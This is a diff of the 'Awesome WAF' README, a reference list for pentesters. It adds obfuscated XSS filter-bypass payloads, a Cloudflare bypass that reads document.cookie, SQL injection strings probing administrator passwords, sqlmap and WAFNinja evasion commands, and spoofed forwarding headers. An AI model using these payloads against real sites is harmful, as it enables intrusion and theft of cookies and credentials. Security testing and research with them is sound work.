@@ -1,7 +1,7 @@
 # Awesome WAF ![Awesome](https://camo.githubusercontent.com/13c4e50d88df7178ae1882a203ed57b641674f94/68747470733a2f2f63646e2e7261776769742e636f6d2f73696e647265736f726875732f617765736f6d652f643733303566333864323966656437386661383536353265336136336531353464643865383832392f6d656469612f62616467652e737667 "Awesome")
 > A curated list of awesome WAF stuff. 
-
-> __NOTE:__ This awesome list is a __work in progress__ list. Have a watch out! :)
+>
+> __Foreword:__ This was originally my own collection on WAFs. I am making it public in the hope that it will be useful for pentesters and researchers out there. "The community just learns from each other." __#SharingisCaring__
 
 ![Main Logo](images/how-wafs-work.png 'How wafs work')
 
@@ -1425,10 +1425,58 @@ __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group b
 - __Filtered Injection__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
 
+---
+
+__Scenario 2: Cross Site Scripting__
+
+##### Step 1:
+- Normal deliberate test:  
+```
+<script>alert()</script>
+```
+- Checking if the firewall is blocking only lowercase:  
+```
+<sCRipT>alert(1)</sCRiPt>
+```
+- Breaking firewall regex with new line (`\r\n`):
+```
+<script>
+alert(1)</script>
+```
+- Bypass trial with hex notation:
+```
+%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3B%3C%2F%73%63%72%69%70%74%3E
+```
+- Bypass trials with ECMAScript6 variation:  
+```
+<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</p>
+<svg><script>alert`1`   
+```
+- Testing for recursive filters:  
+```
+<scr<script>ipt>alert(1);</scr</script>ipt>
+```
+- Bypass trials with anchor tags without whitespaces:  
+```
+<a/href=”j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;”>
+```
+- Bypass trial with HTML encoded notation:
+```
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+```
+- Bypass trial with unicode encoding:
+```
+script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0061 & /=%2F
+```
+- Bypass trial via overflow technique:
+```
+<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
+```
+
 ## Google Dorks Approach:
 
 ## Known Bypasses:
-- __Cloudflare__ - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
+- __Cloudflare__ - Cross Site Scripting _([Source](https://twitter.com/ArbazKiraak/status/1090654066986823680))_
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>
 ```
@@ -1443,7 +1491,6 @@ __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group b
 15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
 stringindatasetchoosen%%' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1
 ```
-
 - __Barracuda__ 
 - Cross Site Scripting _([Source](https://waf.ninja/review-wafninja/))_
 ```
@@ -1542,8 +1589,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 
 ## Awesome Tools
 ### WAF Fingerprinting:
-__1. Fingerprinting with [NMap](https://nmap.org)__:
-
+__1. Fingerprinting with [NMap](https://nmap.org)__:  
 __Source:__ [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
 - Normal WAF Fingerprinting
 
@@ -1559,8 +1605,7 @@ nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive
 nmap --script=http-waf-detect <target>
 ```
 
-__2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:
-
+__2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
 __Source:__ [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
 ```
 wafw00f <target>
@@ -1570,7 +1615,7 @@ wafw00f <target>
 - [WAFBench](https://github.com/microsoft/wafbench) - A WAF performance testing suite by [Microsoft](https://github.com/microsoft).
 - [WAF Testing Framework](https://www.imperva.com/lg/lgw_trial.asp?pid=483) - A free WAF testing tool by [Imperva](https://imperva.com).
 
-### WAF Evading:
+### WAF Evading:  
 __1. Evading WAFs with [SQLMap Tamper Scripts](https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3)__:
 - General Tamper Testing
 ```
@@ -1589,8 +1634,7 @@ sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,bluecoat,chare
 sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
 ```
 
-__2. Evading WAFs with [WAFNinja](https://waf.ninja/)__
-
+__2. Evading WAFs with [WAFNinja](https://waf.ninja/)__  
 __Source:__ [GitHub](https://github.com/khalilbijjou/wafninja)
 - Fuzzing
 ```
@@ -1605,16 +1649,31 @@ python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss
 python wafninja.py insert-fuzz -i select -e select -t sql
 ```
 
-__3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:
-
+__3. Evading WAFs with [WhatWaf](https://github.com/ekultek/whatwaf)__:  
 Source: [GitHub](https://github.com/ekultek/whatwaf)
 ```
 whatwaf -u <target> --ra --throttle 2
 ```
 
+__4. Evading with [Bypass WAF](https://www.codewatch.org/blog/?p=408) - BurpSuite__:  
+Source: [Burp Suite App Store](https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c)
+- Bypass WAF adds some headers to evade some WAF products:
+```
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+```
+- Create a session handling rule in Burp that invokes this extension.
+- Modify the scope to include applicable tools and URLs.
+- Configure the bypass options on the "Bypass WAF" tab.
+
 ## Blogs and Write-ups
 - [Web Application Firewall (WAF) Evasion Techniques #1](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) - By [@Secjuice](https://www.secjuice.com)
 - [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) - By [@Secjuice](https://www.secjuice.com)
+- [Web Application Firewall (WAF) Evasion Techniques #3](https://www.secjuice.com/web-application-firewall-waf-evasion/) - By [@Secjuice](https://www.secjuice.com)
+- [SQL Injection Bypassing WAF](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF) - By [@OWASP](https://owasp.com)
+- [How To Reverse Engineer A Web Application Firewall Using Regular Expression Reversing](https://www.sunnyhoi.com/reverse-engineer-web-application-firewall-using-regular-expression-reversing/) - By [@SunnyHoi](https://sunnyhoi.com)
 - [Bypassing Web-Application Firewalls by abusing SSL/TLS](https://0x09al.github.io/waf/bypass/ssl/2018/07/02/web-application-firewall-bypass.html) - By [@0x09AL](https://github.com/0x09al)
 
 ## Presentations & Research Papers
